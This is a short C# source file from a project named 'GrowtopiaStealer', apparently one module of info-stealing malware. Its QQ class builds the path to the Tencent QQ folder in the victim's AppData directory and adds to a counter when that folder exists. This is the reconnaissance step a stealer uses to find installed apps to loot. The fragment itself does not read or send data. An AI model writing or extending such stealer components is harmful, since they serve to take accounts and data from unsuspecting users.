using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GrowtopiaStealer
{
    class QQ
    {
        #region QQ Path
        public static string dirPathh = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Tencent\\QQ";
        #endregion

        #region Exists or No
        public static void QQExistOrNo()
        {
            DirectoryInfo qq = new DirectoryInfo(Path.Combine(dirPathh));
            // Stop if not exists
            if (!qq.Exists)
                return;
            Counting.QQ++;
        }
        #endregion
    }
}
